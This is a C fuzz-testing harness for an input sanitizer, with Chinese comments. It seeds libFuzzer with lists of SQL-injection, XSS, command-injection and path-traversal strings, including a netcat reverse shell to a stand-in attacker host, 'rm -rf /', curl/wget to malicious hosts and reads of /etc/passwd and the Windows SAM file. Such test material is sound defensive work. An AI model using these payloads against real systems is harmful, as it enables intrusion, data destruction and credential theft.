/**
 * @file fuzz_sanitizer.c
 * @brief 输入净化器模糊测试
 * @author Spharx
 * @date 2024
 *
 * 使用 libFuzzer 对输入净化器进行模糊测试，覆盖：
 * - SQL 注入检测
 * - XSS 跨站脚本检测
 * - 命令注入检测
 * - 路径遍历检测
 * - 特殊字符处理
 */

#include "../../src/sanitizer/sanitizer.h"
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define MAX_INPUT_SIZE 4096
#define MAX_OUTPUT_SIZE 4096

/* 简单的变异函数 */
static void mutate(uint8_t* data, size_t size) {
    if (size == 0) return;

    size_t pos = rand() % size;
    uint8_t mutation = rand() % 256;

    switch (rand() % 5) {
        case 0:
            data[pos] ^= mutation;
            break;
        case 1:
            data[pos] = mutation;
            break;
        case 2:
            if (pos > 0) {
                data[pos] = data[pos - 1];
            }
            break;
        case 3:
            if (pos < size - 1) {
                data[pos] = data[pos + 1];
            }
            break;
        case 4:
            data[pos] = (uint8_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;':\",./<>?"[rand() % 92];
            break;
    }
}

/* SQL 注入模式 */
static const char* sql_injection_patterns[] = {
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM passwords--",
    "1' AND '1'='1",
    "admin'--",
    "' OR 1=1--",
    "1; EXEC xp_cmdshell('dir')--",
    "'; EXECUTE immediate 'DROP TABLE users';--",
    "1' OR '1'='1' /*",
    "1' AND ascii(substring((SELECT password FROM users WHERE username='admin'),1,1))>64--"
};

#define SQL_PATTERNS_COUNT (sizeof(sql_injection_patterns) / sizeof(sql_injection_patterns[0]))

/* XSS 模式 */
static const char* xss_patterns[] = {
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "onclick=alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "<object data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>"
};

#define XSS_PATTERNS_COUNT (sizeof(xss_patterns) / sizeof(xss_patterns[0]))

/* 命令注入模式 */
static const char* command_injection_patterns[] = {
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami &",
    "`id`",
    "$(whoami)",
    "\nls\n",
    "; rm -rf /",
    "| nc -e /bin/sh attacker.com 1234",
    "&& curl malicious.com &&",
    "|| wget malware.com ||"
};

#define CMD_PATTERNS_COUNT (sizeof(command_injection_patterns) / sizeof(command_injection_patterns[0]))

/* 路径遍历模式 */
static const char* path_traversal_patterns[] = {
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/etc/passwd",
    "C:\\Windows\\System32\\config\\SAM",
    "\\\\192.168.1.1\\share\\file",
    "http://localhost/../../../etc/passwd",
    "....\/....\/....\/etc/passwd"
};

#define PATH_PATTERNS_COUNT (sizeof(path_traversal_patterns) / sizeof(path_traversal_patterns[0]))

/* 模糊测试入口点 */
int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {
    if (size == 0 || size > MAX_INPUT_SIZE) {
        return 0;
    }

    sanitizer_t* san = sanitizer_create(NULL);
    if (!san) {
        return 0;
    }

    char* input = (char*)malloc(size + 1);
    if (!input) {
        sanitizer_destroy(san);
        return 0;
    }

    memcpy(input, data, size);
    input[size] = '\0';

    char output[MAX_OUTPUT_SIZE];

    sanitize_result_t result = sanitizer_sanitize(san, input, output, sizeof(output), NULL);

    free(input);
    sanitizer_destroy(san);

    return 0;
}

/* 目标导向的模糊测试 - SQL 注入 */
int LLVMFuzzerTestOneInput_SQL(const uint8_t* data, size_t size) {
    if (size == 0 || size > MAX_INPUT_SIZE) {
        return 0;
    }

    sanitizer_t* san = sanitizer_create(NULL);
    if (!san) {
        return 0;
    }

    char output[MAX_OUTPUT_SIZE];

    for (size_t i = 0; i < SQL_PATTERNS_COUNT; i++) {
        const char* pattern = sql_injection_patterns[i];
        size_t pattern_len = strlen(pattern);

        if (pattern_len > 0 && pattern_len <= size) {
            char* mutated = (char*)malloc(pattern_len + 1);
            if (mutated) {
                memcpy(mutated, pattern, pattern_len);
                mutated[pattern_len] = '\0';

                for (int m = 0; m < 10; m++) {
                    mutate((uint8_t*)mutated, pattern_len);
                    sanitizer_sanitize(san, mutated, output, sizeof(output), NULL);
                }

                free(mutated);
            }
        }
    }

    sanitizer_destroy(san);
    return 0;
}

/* 目标导向的模糊测试 - XSS */
int LLVMFuzzerTestOneInput_XSS(const uint8_t* data, size_t size) {
    if (size == 0 || size > MAX_INPUT_SIZE) {
        return 0;
    }

    sanitizer_t* san = sanitizer_create(NULL);
    if (!san) {
        return 0;
    }

    char output[MAX_OUTPUT_SIZE];

    for (size_t i = 0; i < XSS_PATTERNS_COUNT; i++) {
        const char* pattern = xss_patterns[i];
        size_t pattern_len = strlen(pattern);

        if (pattern_len > 0 && pattern_len <= size) {
            char* mutated = (char*)malloc(pattern_len + 1);
            if (mutated) {
                memcpy(mutated, pattern, pattern_len);
                mutated[pattern_len] = '\0';

                for (int m = 0; m < 10; m++) {
                    mutate((uint8_t*)mutated, pattern_len);
                    sanitizer_sanitize(san, mutated, output, sizeof(output), NULL);
                }

                free(mutated);
            }
        }
    }

    sanitizer_destroy(san);
    return 0;
}

/* 目标导向的模糊测试 - 命令注入 */
int LLVMFuzzerTestOneInput_Command(const uint8_t* data, size_t size) {
    if (size == 0 || size > MAX_INPUT_SIZE) {
        return 0;
    }

    sanitizer_t* san = sanitizer_create(NULL);
    if (!san) {
        return 0;
    }

    char output[MAX_OUTPUT_SIZE];

    for (size_t i = 0; i < CMD_PATTERNS_COUNT; i++) {
        const char* pattern = command_injection_patterns[i];
        size_t pattern_len = strlen(pattern);

        if (pattern_len > 0 && pattern_len <= size) {
            char* mutated = (char*)malloc(pattern_len + 1);
            if (mutated) {
                memcpy(mutated, pattern, pattern_len);
                mutated[pattern_len] = '\0';

                for (int m = 0; m < 10; m++) {
                    mutate((uint8_t*)mutated, pattern_len);
                    sanitizer_sanitize(san, mutated, output, sizeof(output), NULL);
                }

                free(mutated);
            }
        }
    }

    sanitizer_destroy(san);
    return 0;
}

/* 目标导向的模糊测试 - 路径遍历 */
int LLVMFuzzerTestOneInput_PathTraversal(const uint8_t* data, size_t size) {
    if (size == 0 || size > MAX_INPUT_SIZE) {
        return 0;
    }

    sanitizer_t* san = sanitizer_create(NULL);
    if (!san) {
        return 0;
    }

    char output[MAX_OUTPUT_SIZE];

    for (size_t i = 0; i < PATH_PATTERNS_COUNT; i++) {
        const char* pattern = path_traversal_patterns[i];
        size_t pattern_len = strlen(pattern);

        if (pattern_len > 0 && pattern_len <= size) {
            char* mutated = (char*)malloc(pattern_len + 1);
            if (mutated) {
                memcpy(mutated, pattern, pattern_len);
                mutated[pattern_len] = '\0';

                for (int m = 0; m < 10; m++) {
                    mutate((uint8_t*)mutated, pattern_len);
                    sanitizer_sanitize(san, mutated, output, sizeof(output), NULL);
                }

                free(mutated);
            }
        }
    }

    sanitizer_destroy(san);
    return 0;
}

/* 特殊字符模糊测试 */
int LLVMFuzzerTestOneInput_SpecialChars(const uint8_t* data, size_t size) {
    if (size == 0 || size > MAX_INPUT_SIZE) {
        return 0;
    }

    sanitizer_t* san = sanitizer_create(NULL);
    if (!san) {
        return 0;
    }

    char output[MAX_OUTPUT_SIZE];

    const char* special_chars[] = {
        "\x00", "\x01", "\x02", "\x7f", "\xff",
        "<", ">", "&", "\"", "'",
        "/", "\\", "|", ";", ":",
        "\n", "\r", "\t", " ", "!",
        "$", "%", "^", "*", "(",
        ")", "[", "]", "{", "}",
        "~", "`", "@", "#", "+",
        "=", "_", "-", "."
    };

    size_t special_count = sizeof(special_chars) / sizeof(special_chars[0]);

    for (size_t i = 0; i < special_count; i++) {
        const char* chars = special_chars[i];
        size_t chars_len = strlen(chars);

        for (size_t j = 0; j < chars_len; j++) {
            char test[16];
            test[0] = chars[j];
            test[1] = '\0';

            sanitizer_sanitize(san, test, output, sizeof(output), NULL);

            for (int m = 0; m < 10; m++) {
                char mutated[16];
                memcpy(mutated, test, 2);
                mutate((uint8_t*)mutated, 2);
                sanitizer_sanitize(san, mutated, output, sizeof(output), NULL);
            }
        }
    }

    sanitizer_destroy(san);
    return 0;
}

/* 边界条件测试 */
int LLVMFuzzerTestOneInput_EdgeCases(const uint8_t* data, size_t size) {
    sanitizer_t* san = sanitizer_create(NULL);
    if (!san) {
        return 0;
    }

    char output[MAX_OUTPUT_SIZE];

    sanitizer_sanitize(san, "", output, sizeof(output), NULL);
    sanitizer_sanitize(san, "a", output, sizeof(output), NULL);
    sanitizer_sanitize(san, "A", output, sizeof(output), NULL);
    sanitizer_sanitize(san, "0", output, sizeof(output), NULL);
    sanitizer_sanitize(san, "_", output, sizeof(output), NULL);
    sanitizer_sanitize(san, "-", output, sizeof(output), NULL);
    sanitizer_sanitize(san, ".", output, sizeof(output), NULL);

    sanitizer_sanitize(san, "a" "b" "c", output, sizeof(output), NULL);

    char very_long[8192];
    memset(very_long, 'A', sizeof(very_long) - 1);
    very_long[sizeof(very_long) - 1] = '\0';
    sanitizer_sanitize(san, very_long, output, sizeof(output), NULL);

    sanitizer_sanitize(san, very_long, output, 1, NULL);
    sanitizer_sanitize(san, very_long, output, 0, NULL);

    sanitizer_destroy(san);
    return 0;
}